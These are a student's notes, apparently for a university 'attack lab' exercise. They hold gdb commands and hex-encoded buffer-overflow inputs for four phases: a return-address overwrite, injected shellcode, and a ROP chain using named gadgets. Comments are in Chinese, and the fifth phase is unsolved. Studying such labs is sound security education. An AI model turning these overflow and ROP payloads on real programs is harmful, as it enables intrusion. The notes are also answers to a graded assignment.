use this command to debug in gdb:
r -q < <(./hex2raw -i hex2raw.in)
show byte in memory:
x/10cx $rsp

phase1:
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 c0 17 40 00

phase2:
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 b0 dc 61 55 00 00 00 00 ec 17 40 00 00 00 00 00 bf fa 97 b9 59 c3
#注意在生成汇编代码的时候常数要加$

phase3:
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 b0 dc 61 55 00 00 00 00 fa 18 40 00 00 00 00 00 8d 7c 24 30 be 35 39 62 39 89 74 24 30 be 39 37 66 61 89 74 24 34 be 00 00 00 00 89 74 24 38 c3
#注意字符串的地址不能把注入的代码地址覆盖了
0x39623935      0x61663739      0x00000000

phase4:
61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 cc 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 c5 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00
利用pop 向寄存器传入数据
正确的gadget是getval_280+2和setval_426+2

phase5:
还没想法，只知道有pop %rsp
